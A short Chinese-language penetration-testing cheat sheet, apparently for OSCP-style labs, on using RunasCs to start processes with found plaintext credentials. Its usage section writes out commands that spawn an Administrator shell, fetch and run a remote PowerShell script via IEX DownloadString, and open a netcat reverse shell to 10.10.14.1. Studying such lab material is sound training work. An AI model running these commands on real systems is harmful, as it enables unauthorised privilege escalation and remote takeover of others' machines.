# RunasCs

## 介绍

RunasCs是一个Windows凭据切换/进程启动的工具,本质是runas.exe的增强版,在渗透测试中非常有用.

本质=RunasCs可以在不弹GUi,不交互的情况下,用明文用户名+面膜启动一个信进程(甚至反弹Shell)

## 它解决了什么问题?

Windows自带的Runas有几个硬伤

(1)不能直接传密码

(2)不适合脚本化/反弹shell

(3)经常被UAC/环境限制死

| 能力                    | runas | RunasCs |
| ----------------------- | ----- | ------- |
| 明文密码                | ❌     | ✅       |
| 非交互                  | ❌     | ✅       |
| 直接起 cmd / powershell | 一般  | ✅       |
| 反弹 shell              | ❌     | ✅       |
| OSCP 友好               | ❌     | ✅       |

##  RunasCs 切换到目标用户

比如你当前是 `webuser`，但你拿到了：

Administrator / P@ssw0rd!

## 本地提权 / 横向移动（不打服务、不用 PsExec）

不需要管理员远程服务

不依赖 SMB / RPC

很安静（适合考试）

### 基本用法

```
RunasCs.exe Administrator P@ssw0rd! cmd.exe
```

> 直接弹一个 **Administrator 权限的 cmd**

### 直接反弹shell

```
RunasCs.exe administrator P@ssw0rd! ^
"powershell -c IEX(New-Object Net.WebClient).DownloadString('http://10.10.14.1/shell.ps1')"
```

### 或者

```
RunasCs.exe user pass "nc.exe 10.10.14.1 4444 -e cmd.exe"
```

### 和这些工具区别

| 工具        | 适合场景                        |
| ----------- | ------------------------------- |
| runas       | 日常 Windows 操作（不适合渗透） |
| **RunasCs** | **明文凭据 → 起 shell（首选）** |
| PsExec      | 需要管理员 + 服务               |
| WinRM / WMI | 需要配置 & 端口                 |
| mimikatz    | 拿凭据                          |
| RunasCs     | **用凭据**                      |